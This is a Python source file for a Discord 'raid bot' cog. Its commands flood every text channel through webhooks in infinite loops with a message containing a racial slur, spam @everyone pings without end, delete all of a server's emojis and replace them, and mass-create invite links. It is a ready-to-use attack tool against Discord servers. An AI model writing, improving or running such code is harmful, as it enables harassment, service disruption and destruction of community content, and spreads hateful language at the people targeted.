# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import os

class Spam(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def spam(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        spam_content = "NIGGAS GETTING RAIDED BY POPELKA\n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot.github.io>)||"
        async def nuke_channel(channel):
            try:
                webhook = await channel.create_webhook(name="POPELKA RAID")
                while True:
                    await webhook.send(spam_content, username="POPELKA ON TOP")
            except:
                pass
        for channel in ctx.guild.text_channels:
            self.bot.loop.create_task(nuke_channel(channel))

    @commands.command()
    async def spam_ping(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        while True:
            await ctx.send(
                "@everyone\n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot.github.io>)||")

    @commands.command()
    @commands.has_permissions(manage_emojis=True)
    async def emoji_spam(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
    
        guild = ctx.guild
        deleted_count = 0
    
        for emoji in guild.emojis:
            try:
                await emoji.delete()
                deleted_count += 1
                print(f"deleted emoji: {emoji.name}")
            except discord.Forbidden:
                print(f"no permission to delete emoji: {emoji.name}")
            except Exception as e:
                print(f"error deleting emoji {emoji.name}: {e}")
        if os.path.exists("pfp.webp"):
            with open("pfp.webp", 'rb') as f:
                emoji_data = f.read()
            
                for i in range(50):
                    try:
                        await guild.create_custom_emoji(name=f"popelka{i}", image=emoji_data)
                        print(f"created emoji popelka{i}")
                    except:
                        break

    @commands.command()
    async def invite_spam(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
    
        guild = ctx.guild
    
        for channel in guild.text_channels:
            try:
                for _ in range(10):
                    invite = await channel.create_invite(max_uses=1, max_age=300)
                    print(f"raid invite: {invite.url}")
            except:
                pass

async def setup(bot):
    await bot.add_cog(Spam(bot))